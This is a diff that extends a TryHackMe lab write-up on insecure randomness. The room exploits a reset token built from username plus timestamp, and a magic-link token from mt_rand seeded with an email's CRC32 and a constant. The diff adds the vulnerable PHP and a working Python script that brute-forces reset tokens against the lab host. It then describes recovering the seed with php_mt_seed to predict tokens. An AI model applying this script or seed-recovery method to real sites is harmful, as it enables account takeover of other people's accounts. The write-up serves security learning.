@@ -18,11 +18,19 @@ Seeding refers to providing an initial value, known as a seed, to a secure crypt
 
 Skipping to the practical aspect of the room
 
+# Practical Scenario
+
 I was given a login page to work with and this is where things get interesting. I was going to abuse the forgot password feature of the login page.
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-30-50.png)
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-08.png)
 
 So, I had to understand how the site forgot feature randomness works and with that, I was able to understand the randomness was not random. I got to know that the site sends a link to your email and this link had the userid and the time the token was generated as the token.
 
-> $stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
+> PHP code of the token generation 
+		
+		$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
 
         $stmt->execute([':username' => $user_id]);
 
@@ -32,3 +40,77 @@ So, I had to understand how the site forgot feature randomness works and with th
 
 	    $token = $user_id . time();
             $update = $db->prepare("UPDATE users SET reset_token = :token WHERE username = :username");
+
+With this knowledge and the provided python code in the room
+
+> Python code
+
+	import requests
+	import sys
+
+	# Function to brute force the reset token
+	def brute_force_token(username, start_timestamp):
+    	url = "http://random.thm:8090/case/reset_password.php"
+    
+    # Try tokens within a range of -5 minutes
+    	for i in range(-300, 0):
+        	current_timestamp = start_timestamp + i
+        	token = f"{username}{current_timestamp}"
+        	params = {'token': token}
+        
+        	response = requests.get(url, params=params)
+        
+        	# Check if the token is valid
+        	if "Invalid or expired token." not in response.text:
+            print(f"Correct token identified: {token}")
+            return token
+        else:
+            print(f"Tried token: {token} (Invalid)")
+    
+    	print("No valid token found in the given range.")
+    	return None
+
+	if len(sys.argv) != 3:
+    	print("Usage: python exploit.py <username> <unix_timestamp>")
+    	sys.exit(1)
+
+	username = sys.argv[1]
+	start_timestamp = int(sys.argv[2])
+
+	brute_force_token(username, start_timestamp)
+
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-47.png)
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_21-25-33.png)
+
+I can now bruteforce the token with the python code till I get the correct token for the reset password link. With this, I can get access to any account using this means as far as I have the username of the account.
+
+
+
+Moving on...........
+
+## Predicted Seed in PRNGs
+
+In this scenario, we will explore how using predictable seeds to generate tokens in a magic link login system can lead to account takeover. The magic link token is generated using PHP's mt_rand() function, which is seeded with a combination of the CRC32 value of the user’s email address and a random constant. By analysing the token generation process, an attacker can reverse-engineer the seed and predict valid tokens.
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-31-00.png)
+
+Going throught the link generate to the email, the token in the link is a base64 encoding and with analysis of the server-side code provided
+
+> Server-side code
+
+	mt_srand(CONSTANT_VALUE + crc32($email));
+
+	$random_number = mt_rand();
+	$token = base64_encode($random_number);
+
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-31-33.png)
+Image of the CRC32 for the target email
+
+Decoded the Base64 string and got a number
+
+Using php_mt_seed, I ran a scan to get the seed for the number. Upon identifying the seed, I used cyberchef to get the CRC-32 Checksum for the users email. With that, I was able to do the maths of subtracting 970731467 from 970732804, I got 1337 which is the used by the attacker to predict the generated token by adding the value to the CRC32 of the user's email
+
+![image alt](https://github.com/bakel243687/TryHackme/blob/cb958a53a08fb4d547603a04bcaec3cefb907303/Walkthroughs/Images/Screenshot_2025-10-02_23-29-49.png)
